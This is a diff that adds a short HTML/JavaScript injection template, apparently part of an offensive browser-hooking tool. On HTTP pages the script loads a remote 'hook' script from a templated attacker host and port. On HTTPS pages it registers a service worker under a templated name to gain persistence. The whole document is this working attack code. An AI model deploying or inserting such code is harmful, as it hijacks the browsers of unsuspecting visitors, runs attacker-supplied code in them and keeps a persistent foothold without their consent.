@@ -1,0 +1,21 @@
+<script type="text/javascript">
+if ('_injected' in window) {
+} else if (location.protocol == 'http:') {
+    var head= document.getElementsByTagName('head')[0];
+    var script= document.createElement('script');
+    script.type= 'text/javascript';
+    script.src= 'http://{{ hook_host }}:{{ hook_port_http }}/hook';
+    head.appendChild(script);
+} else {
+    window.addEventListener('load', function() {
+        if ("serviceWorker" in navigator) {
+            navigator.serviceWorker.register("/{{ sw_name }}.js").then(function(reg) {
+                //console.log("ServiceWorker registered")
+            }, function(err) {
+                //console.log("Failed to register ServiceWorker:", err);
+            });
+        } else {
+            //console.log("ServiceWorker not available");
+        }
+    });
+}</script>
